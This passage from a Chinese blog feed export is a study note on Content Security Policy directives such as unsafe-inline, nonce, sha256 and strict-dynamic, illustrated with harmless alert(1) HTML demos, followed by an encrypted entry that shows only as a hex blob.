<h2 id="CSP规则"><a href="#CSP规则" class="headerlink" title="CSP规则"></a>CSP规则</h2><p>在上面的例子就用了<code>script-src &#39;none&#39;</code>导致了任何的脚本都不会被执行，包括onerror那些<br><code>default-src</code>就是预设的指示，如果某个指示，例如<code>script-src</code>没有设置任何规则，那么就会使用<code>default-src</code>的规则。<br>但是有几个是不会使用<code>default-src</code>的内容的，如下</p>
<ul>
<li>base-uri</li>
<li>form-action</li>
<li>frame-ancestors</li>
<li>report-uri</li>
<li>sandbox</li>
</ul>
<p>详细内容请看<br><a href="https://content-security-policy.com/default-src/">https://content-security-policy.com/default-src/</a></p>
<p>还有其他的指示，我这里直接使用huli佬的<br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt><br>下面两个链接是官方文档</p>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://content-security-policy.com">https://content-security-policy.com</a></li>
</ul>
<p>当然，每个指示都会有相应的规则，那么一般使用哪些规则呢，我这里也偷懒直接用huli佬的截图</p>
<p><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt></p>
<p>例如<code>script-src *</code>就相当于允许除了<code>data:</code>,<code>blob:</code>，还有<code>file:</code>,demo如下<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src *&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">test.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>但是直接运行的话，就像下面的代码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src *&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p>
<p>这种直接运行的还是不行。只能用加载js的方式<code>&lt;script src=xxx&gt;</code>。<br>想直接运行代码，还是得用<code>unsafe-inline</code></p>
<h3 id="script-src-规则"><a href="#script-src-规则" class="headerlink" title="script-src 规则"></a>script-src 规则</h3><h4 id="unsafe-inline"><a href="#unsafe-inline" class="headerlink" title="unsafe-inline"></a>unsafe-inline</h4><p>允许执行inline js<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h4 id="unsafe-eval"><a href="#unsafe-eval" class="headerlink" title="unsafe-eval"></a>unsafe-eval</h4><p>前一个策略允许执行js代码，但是不会运行动态执行js代码，也就是说<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><br><span class="line"><span class="title class_">Function</span>(<span class="string">&#x27;&#x27;</span>)()</span><br></pre></td></tr></table></figure><br>类似这些<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;</span><span class="comment">&lt;!-- 仍然需要unsafe-inline，不然不能执行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&#x27;alert(1)&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h4 id="nonce-xxx"><a href="#nonce-xxx" class="headerlink" title="nonce-xxx"></a>nonce-xxx</h4><p>允许<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-123&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">123</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>不允许执行不一样的与csp中的nonce不一样的</p>
<h4 id="sha256-xxxx"><a href="#sha256-xxxx" class="headerlink" title="sha256-xxxx"></a>sha256-xxxx</h4><p>我这里用一段python代码完成这个，也方便以后的操作<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;alert(1)&quot;</span></span><br><span class="line">hash_object = hashlib.sha256(message.encode())</span><br><span class="line">hash_base64 = base64.b64encode(hash_object.digest())</span><br><span class="line"><span class="built_in">print</span>(hash_base64.decode())</span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/5.png" alt></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行执行sha256一样的</p>
<h4 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-rjg103rj1298e&#x27; &#x27;strict-dynamic&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">rjg103rj1298e</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> element = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    element.<span class="property">src</span> = <span class="string">&#x27;test.js&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(element)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>从<code>nonce=rjg103rj1298e</code>这段生成的js代码也可以运行，因为<code>strict-dynamic</code></p>
<h2 id="CSP的配置"><a href="#CSP的配置" class="headerlink" title="CSP的配置"></a>CSP的配置</h2><p><a href="https://csp-evaluator.withgoogle.com">https://csp-evaluator.withgoogle.com</a><br>可以用这个网站查看csp策略是否有问题</p>
]]></content>
      <categories>
        <category>前端安全</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题1</title>
    <url>/2023/09/25/%E5%88%B7%E9%A2%981/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="bb772bca8816af75deb46183da65fe6048f9fd836cc8d95dbcd696be3ae1602f">997c39fd209fc88ff14214af16a192b2c0d0a378e6a90d93e73b2a42d40bfff425223b0010fbef6098fd77e2e50a8df9b7f8cd1a0eef03434f8e13d2676653c9d2099f98d789eb4b4e3c71716daa8d010d5e846c49307001e87045103df34650f08d5adad248b016ff7d46373642495963d1ef9cfd94e2b63a68128e9cf4603fd142789b405e9e7e036cebddfe3c7f0889451dbbdc612a3a7ddf1d79329be26a1f144268b299cf488e1e75e3db41d39367a43478169a757cb8a25c9fe2d50daa2a38f9b3fd6d23bc5cbd80cda14837451df80712cfae1e5e97483ce0d3f37db3ee78debce4c98c959cd89adc8ae2f753cefb30fc439984e213c5dec67bba5b26e7b7f8b7933b30ce2886c4e089946afbc0bf047c397a4778e54a2ecfab9355d0a35117fb850a44134dd0f98cc84e6cafe6687795afb235943e444f9b2d7966c8c6ca22c709dc37bee2ead4bb88f26c75d4084d6275e95c23e302196ab37944f7b94ec4658a692bf90caf2ee1f41c6cf2e85ccad8ac9d35fc5859c98c8ce02a05e3b4224dcffead49e0bec9b5079344fb0ef078f3d06ba82e7d81a99295090fc91a1c73f770c484ea179f8d724a29901ca56910ee26c906fd48406469ad9ba370d2d383a18acb9bdb64b7e72a0f78db3dca1b338c228b0fb226d96b1c56ac34066c7129865a9a22be633e025cb4e37251ce87eb30d80f972ef8d90de094c010218b3683f674e75462f68cd61e9fb2dc7bb3506f6df010c3f9bcf929bd36ba9c0ded22d0ca7e3277d379e116f3744ac419dea9846cc99daebcf3808f051d6438d8858a3798f0b2dad676db82c7137b761f5bb1c025e7579b4fa96adad8428d38079d43a725c5d1287a0ce69feff534f3bb536121cf6ceb610868d326fd44993d52ab29b6f5d4b9d950daf40dd57417bad2dcce46ee0d9fa6aeadcfd4c8e9df1cee7283c88a34a782c03fe51d461f200546802d05aeb44acdc601ab26be55e57dad4f9e2a391aeff87b20977857cd348bf787a0d4261fdc451b025957c8b6eb6b20a434867ca76f6710c21c3c3a538e545ae856e411cb59740d889f7eb91eb273e9f2e7af97f585aed9ca0def919395cac8e889e0d61075843e04ebc476b39781dc81c7e1f799307675615ef473c2c465e043a83c7f8c93abd730610201830110ef3f917e1eb2db2479eed91b5104edef7324b8ce5dffec4d98d526ccb71815b31db4a7c8906db6db525478d12c91c0d43d43629ab2d28a667e9ca90baebece31903c902692b9d6553c4fb6cdda688ed16067a524546f297c8d1ae2b18cba02e5e9537ecfbe9003f452cf2aef4f50da4575b2afc2e7d0205932dd8dcb07fea21e8e45f1ae8e33a40ac8004ee5b97ae17aac3540e63040ba3bb386091aed8bff6ead8ba7224d0272ab33db29d11eef035237774be0a49720918592c9c690802b8e6b44a2e5c84cfd09e2848acb9447d4a3ccddcdf62ffa88603a6fb92dc1bfe3e13cea857177ff6db18c9a0c93db3b9f830b87b95dc909a7f0988f57aa6e1d0e39fbcfdce76b51c94b954c6c4e32a6389fdfe3da34c1b74a1f047390e91e51c79379b6c11772725e068bb3176bbbfdf2d50b5a0544f79513d5f490b4d7c2d2ba16f7dc49ec3fab199c4bc2e657293af78fea59d7a5210cf38328b5d8dc4473ed28aa0bcc9478b252d8f111f55f67cbc65740d1b39cf3b3da3e3d471e3df6ca0c8d6c935b7f857f7eb67813b2327fb86fdcb72731fb544fb3bfbc48ee6151290dc46a6d200f1b1daace973810b352df95ebc1e7587e85757bae0f2335727653d09b93b49b4dc4312709d91af5887cbb3fdedecd1b5b7f1891c858c770d839f5bca34975a651d15b42152889acbdd41033672a5753ef830d6d8b6c0c7e9a3d3585552762a53a18ae09620cc088604e62215289d5f5df1f503ca7ac62bcdd1d49436b612a43a64e1f804b1849e6a871d49a43fe08d54fd69a836bb4887d1702b2b19ff593c8b3af4e03c97519923bcc637fb0caaf6869e104dc85ff5ea13ce613f6abc4f85eec2c0009090f6074d39fc1269211951d0020177b347b9ae26536473d51c881b1bab519fc6ba87f7d88be255aa2d90587729e33512b0b5471b8f76b6d3707ee60168de998e6fda25c90f05aaec79207430faeca9e26f11b6106b8406f101623d5cf9cd70953dabef0d34fc8e52ba52606e3171150b21dc2ecbc016355605970ea2c5b93262eb6ad1793069b32aeb702870bbaf975e8ef34ba883e747702312e2d02bbb7b078b71151a08ff280792ffaf4f633c233b1926372e895b95ef62551c96721895e192fda6934e627cb45aaf25d11de5b268b1b4319c153372ee1962fc45c06765575063d52efaa0445bba732f3abb5fd4f1a85077f29952ee6e4afadccfc6916a74173e6f650c227e58b9850a8336530ac30e182576fa530b37a94d3db3f39f915b6534149cdbad6655ca95860d5e3ca8c76cd76057e0617b30c3eadeae4cf564fcccee7c6548714c9661085e970e38c567a628da297f9ea9fbd24ed26e29c6d54ef5e261f4363c7ac4ceccef0960ee7811857a87127e289a170351ce9a15d9303220d07cc1f86f054e93dd9bd22cbb9b5ac177400cd85c283d0bbef342367aab0a16b26d653f4ffe57457e48f133562afa76b7d98ca3275eaff22851042831bad66d11d41f51c95121234f5516314230b8e492f7e6f387fe1882758be9ad1fa011f108c9ed4b9105cc2ad0954d3be39b87788e7ae30031c811dd46aecf2309e73386e7d19928720c379ca06f9989ba9e709e4919a1341a0f616edcbc1577076e74f7ce35221d19d3c11a9aea4f2b0ca2b919f1745541a0c93813f40f3dd7e1c710c57dffc591eeb81b07f3ab7f18c77a969ca83d25245f4dc2d6d46baf55cf8b09b17b01d6fbc48cea3f54e7c3b284793d4b257a1241f6235a5cd63083083782a195f2075f83fca93bc85b0b8bef030c468ddd1bc3430868ea28aeb631db772888830a53f6efdeea59bd0f6adbf235306d598f478c366762daea46c3efde5dc67e3755553566bf353975d397bd7e87c6ef6901333f06e622c802537927816460814c4e12bbbf0bdfe6c41c37b1838f5b658f183ba563f620a6b388b852da90d50a6e5173e84323a9f7cf0284edc796225f5028163b23dea4ef92b17c340a58863040f3e97d6b6104222a8de242fafcef5b2accd90f3991fe0878973c447d42fa1c0e1d4f81f19033722b569934d63e5f1c9979bb9497948e92954032fc6368884420b65124643543d6aff14fab55e9736930093793fd60f5ee92d93ae3174b2bfdccefa2de4484215e551bf5b90b51940630c066c2ba46d0487efa8f7068f288c7f03448afe6d55f1637856559156d99101be538b4ecd969f8768d8b9855b6b1485669293ee46e9e20170397ce35fab44f2e30cbb0291e769d34039883a95b6f9b0775307e90335f41646dcfda594298e4ba4b011217fc5dbc52976796d79833f872eeff73c2c21acf10928e51224bb75aef96bd691ecdbb533ccfb4f56ba30ca84bbdd07852c1a5c455da059bf60487ce7fbe837be56f21ab52473a6b591c7ba10b1f8213396be8f0870ed48e0cc1533475ea112e0221d93694a2f4740d8f4dc2f68fd683b8476a97ef4076a27174dee8157d623aa7256722bf080b0961e170454a4f0ee4191ccc91552b1df44ce7907bfeaa9a338845a0bc5a81de102afc0f58d5520327a21027dee3ade21c67fc878653214213f5edc83f97886bdec7d30f488d705ca7000276b3dc32d5cbd43d14d0bd48abc08cb0954f397ba4425b5d9d2c0eba512afc1161f9aa73cbfaae0156637701d3a546b33f34f988f68291a98a858cf8cb193f904b9e9cf308363e6ed9f65aca40f033323811b62daedba33bb1a8a6e140b08409ba70e6f01bf913430904d42491d3b44b7c9c62ca1b826eb604b353758127b63f3df187ceab3dfcfc8775db9e7e36c36ac249c5180835960a551d02964cad7b648058faf837336cfa4948cbb01ef32b9b721203f1e5c09627e1df5a7df3dcd25de856b76d9d23c678d631c4590a2c4ecdbaca3fbd31fb51e2c1c394bb7c5f618bc94a1e1cba1cc3035ffd972596f845353cbccbc65e58aa9bd3ba5c45517401929ee082a03560f70395e5ffa14d6d309dd7ed57ab74599037968b03c5bbcfe2491de0680971d1876b13cb8eb5ff3edc8658c99c38a360adae163ef8953cbffa8bd5002902bc72dfe7552e34329c88e993548e9da4805ec23228e1466a5c2a8324a01b97d5e1f890d1e89df1df78af09d1ec024ece9e9f65a4a6ef227342ed764254e0b663dd44b5bb6d635994b90bcdbaf3927329d661602c9448f2fd906d5f9c3e75d982842291348a23192133911a9c4769b3885cb79b4caef4e172bb55054108135db1847f89c633e10c6f7e21fcfdd6991fc58b73b41553436e1aa34dd4d9d7a7ef8dee97df5bf6698086714b48d712098db9a27131d0801edcb641421d763458a8ec6a3faf6ddffd5efc0866282aeef53a4fb7c53bd6e29114cb181d86408d310672c6a429a83847d7a89122469101e0fce1b4fb55033a9cec0a61af8be3cfd43de7ca5c1bfa5e8f5988bcbae3c3a32ab1cd90b78d87075f8b5e0dfcb38742869353d8ab063ad0ab9d577433d5d6f6b488e0c6aa42857e2e74c72c80533019e02c54cad1c8c2ae98e3cd6d739ff084690e1729b384ac3c36d70779011135758f583f5ed106446c82e9eac7230ab5ceda710c2a16d0cfe9b0ce7fc97fc5685b492cffb365198d9b981d1fabce4148dfa9879c35cc264c1b6ab77f321064e475a2717963a25d932487d04dc56f74ee204f48afb84fbdc659e5d683341dbb6d9a0fa05a09add5db065fa0a094634f604ef9047b106d664d07e89adeb3f4bbfa4c8596ad2b3c2cbaaecab88f3a05f6abd4147d00ee724fcf33800ddf29492c7b9e5f5e9e26c278fded4a10a4be0c150eea86b3315b32c0eed03f3ffe8d003e892951e1daebda050494f6e1fa5dbe49c12da44673caee5eafffe24fe6d0d160b9a8a84dc60b35b862b73f754df81a3aee3867c40ad0165d51ea87bf897e95977553d68343b691d7de7168da77ec2a4ea1c27f7ed566726bc34f22a0bdd75bddf3578cce91d51caf7375022ebf9b31b0b65d1e04a3e676648d675375f061ad7dbd9d765b5624888f8a5c6e198b39106135d67ed7f2ac7fd12003b02c4fcd5e6f2cd1deb5d9a5c005d8f29254adffbc0a5871c857891b01e488b9beab67563be62658cccae7f0056ff8051de217919a4f18b00c60e343468f359528fd568b4bf025cd29a924bbbae4d4dfee53a4b7d1e95a402d20dee85763d9dfb6a77220d5e55662c5ba7148065b41f5ac4b8bd7b2203ffae1a9dff07c0923befba1dac36e5608fa4daf230e1535a2bee8e33f696641c193648364c53b6912b270ad57502dcd099ef6256cd505bd46d511497ce4058003333054e9d49e194a06adc00c44d22702682315a88e21e5dc054812a85f5087513338a46976ac932a25671533c8cbf9dfff2e3117c043fca7dcb70c68437ebedd4c70b41b169117cba005f9b5937344d4fb7f2dc83326eab248e9af15f60b666e458ab1a10239cde5aadf125a7f3c40d42069e3fc1bdb232c87395006ea1a756ede166e8c05ab7edc0a350fb04267556fcd5991856f5837f15d9ff13c421fc92e85893d0754edac789f245e7406036ba03593758f45f57c498938968cbb52f4cd5635c96d9280f1fc01c000ebe62e741a5dff4175f1653f970ceed93ccb72993dd5e3e48d4d1600026f0aae46881505798981ae886ce7edc5f333f17da6bcf21a3370d8371fba2c4dea6e3d3af7fcaef19c90d27a9628d25cee1069d44f90e89fc4e1e167228b1a1aede37996f910d7af8fb0c87e27a70264f9f39dfe9e322378df2c05d0fa937e85f84eec815003b8aee4e4eb5e2521a99434dd03c6c27e1f2bc364376714943a27022d7e3d923afec3019645200685f6f940473c482ba4fba86943b056b9c6013baf8ab68f933925fbc7728e822de9ce7fe8d5c5642fcc10924f4ea396e9e8c3d2af24154544ac7b9bf2c995c0249709099b62bb798773af8c64855d1e398f0b60fdcda929710dae3840b9428717fa131c3de1eff0624873e0df0f19717de23daefb610b35d4f05ee95629c4ad7e1b15fb5f4d4804b42dd482d7f920a90608378c5f76d6532768ac6dad05e41fdf41182ffda2fb8399a3ca86720c3b2f8d185ece9e313e4967a52fc8222c3ee46c1fb4e59850daf7d00be1ce380c082780e66c9302909b4c598545d68de03dac617e440e424df0f5623ec775d7078f9592063862e15ead822241143095101517cce5d2147b10f294ed0160a3f8bfc79d5998e985a81d0d0406cbd418afbbe3c7dcb7f8ad1993926ab61c310588ba1314250e4962bedf2c3887ee11daa3f4ce6580899e349a662e60b28fd89b477026a73fa4b3428d1ce1136b7a65ecaba9243fbb2b1b757d01855895e0377750e7717666cb8a652a7eeab7bbcebd495ed172c59944cd3a2a94ea01f3e7dfed5d9e23a7f5cf673a9ca7c57d104bfc6c8b72b2470b0b10ef6c8e725a7db8faa855e613922441e5ec04dc5ba02d436a2281c9644b2720c6efab9818dd4928dfbf6d68b03320371513d09ee8360c5b967d6e95666f5cfaaea949246cf8677bc0a11e2de57d876bf12740aa344f3cae7de4d69fc1594e2312924de1fb33d5f8e97f718706f263b585b72f746cffcfc192076545292b58467c20ae6884ffeb345839fa0850f692aa311c41cb7da7e0acc438356e7da8a9355df98f06e2ae43513ed7096ecab7aa8656b010d87e8c53f90105d94432ae03c94186bb5a87f8af1bf2205813c4915b35be8c43721d39a116f4c1b45dc6671204e3b491a70d909898518be8fe883eaacb8a5ec7eef27cf61e4863d7b20ebe2b5b130cc787cb28428757903cbf815321ce85b1c85f6adeabf85cf5365266c302ffa1562bb4abdea5fb022d0ee06a44094cf78254e2e49029da34de2d17030fe61cf4c62d9668a6fcf61f3cc30c4d6ffe985a0571bb4e1443fd308876a1b1f2f9bd6b1fa64c88bf53b41579007d128328078da590b5bbf6f88f4e16cca4b7e67fd664c3caf3e081468982b2649a3b79755698c132e1cde4a08cca60a71c384f6617aadd8a94af53a69b9a9c7e76550bc50c3932ea478c49659e2009c56243f0173afa62eb0f22d712f3456f986b6f119c08a810e52de9f18961638647b856819847286521e587b9665d7170569a267bc6e347e3f3facb2301562f0ec45dced6276c97b5c1fb63940f9861b6fd65fda816db82cf90effaea4da13aadbf6d60fe9ab117ba1ff55a35031cfbd7c6981cc55124fe1cdca3ec94278df6e342fb294c647c50a4a23efeaf5c3ad0a93925089266c5fcff724f830b4be989f275b2e65cd876771dfa9fef3f7745bc2fdcce3b1f08c9245c329dfcb5fbe20a221b821b5f00db4c3d998f5967ec8b7242d544d757ac48abf20400d0d3c1feb2c003047b627595edc87857341de8f45937a6515bcc11b11902faf221c00fccc741932ef0b8cba8a965b27392506d2dd96fb29454d03fd08273db52907250b4aad4f211eb3dbb9c7872515d03a4d520e7acf150b4118fc86af00fcd647167ff121c7dc20beb0eba0b25ac3471cbcec2f47165473c2bfc02f5fccaa76e68b168fdcb08545c7ea7fcf402c3cd7805adb09a28bf05e28398e0329c5ce635ca810ad051492c93093d31dedff472606f4382181588afa880cb6ad663ddb012f0c1a69d81bdb9ba97a805921b89fe2a57b0256bc99b31a1d235749bf6debabe95d8f321734e17c4eee43e76e0ff83444655f84190cdb40d2be15c7a1fbee56e84255823c009bff5fd4f6813f8da52e03da3d95e05c9353225f302268d8c9959bba0feda3acbd766cbc126f7b1f8527d7cd625d2bd2da182cc6f760fd3db0f29302d9fb36623d2c14dcba390ef4bff58ead56c21f8cd9865726023c6cf2d21cd2f36e735329855d6f235138bd90e6c8d6f8f1c1ff8b87d5e1a14d941148a7061691569bda359f1365fbcc3adc3cd778927d342bf001d56564f81fcbadc899ad5dad3debe2c5f6712b85c0b6306f6aa1a61db47fcdb55bea6c956ec0e0b30b144bfb3b2cbadee5c33543d3cdb0c041d2012a6802807b92dc9ad6717f186c6305a9b550f179e7770247f30c5f6c567d0f3105896e9180b31ea06884180e498048cbb963f989de07b79e2db20974f3eb7a243502d379cd0c8682d691223e182d8085342618c7888b873d6cf95bedfb61ee9d50abf940eea9beb0df1959024358731fe8be94176998d9f244df67df558b53144493e50cf44c7d070491731ed8b90adad3e48ef87954afdcd09315de88dfc94dc6d21eaf48c5348bd52758f62caf366bcb94a2d40d4be3eb56d64f8f59e99962783fbb9a79252c7ea2e7d8389652ae8574cfec3c08fa962074bb1728cea727d3b9e6c93234f397764f2046f611c6b3df22d55605fb399485318c702cebdc4b918d3391a364e7822f21802e2d437c9bc2e68b9f92c569a61bf4f135d73206a711818f0a28221b265008173509a8cda578dce6b4ffd78d1f365a2d198b53a44d6030f46c2a5cb44d2c8b3419ce1a60ab1062d58532de79b59edda18a41fc8753b3b257213737d1312649536f6c18ae950aef49cc7524ecf45343eb251563745c5e3bb5a9593e7e75b4b3ab823d13cbc325ae96abfd3334dc9a7f6056a5ef7059a83dfbd68c359b650c3092b691b64e9897ed41991b360b9b551854febd42c8117d61c69165b65d7b671e6b49d0ebf163b1767e66003ce5c389c75e89316584c532022f5bbde91b77f8df33e0fbde728d80bc71a3a430b2e61899b1f4a910dc2828798d0169ce711759487e3f06520df7c77ace6995abc9a6cdae4a7427caac54c56105c4fc85710dd9595eb0126183f3216043f674b47e27701b8736ec9d33ebb232178f2fe0ccc3439549f473e4cca39a1ed71a63560f0af694813fe0dd28ac99e7283e98816adc44284111a2a143ea73a62e70651c276c5730fe801418be13ade7181af514bf3b587db471e5df0dbe5421e5beaff6c1b2e04c0c0135a0dece11692ab40197d893fea8d30f819d48ba6f573c116cac68cf6894a50127e630652bb68a7f80cf32bbe2a9c9f058fa02ea254a0d84d24ea5e6265f3990d37de2a247e5910231d934bc320b718cab2c3273b49f6237b66073dbfee6b9991f8c94d93fab8a0709a9f086992b8f60ec95fc4bb7391f16eb7d2361e6da21435417c985c57f70f1e1c4434528a74346a190e1aab133ef8611513453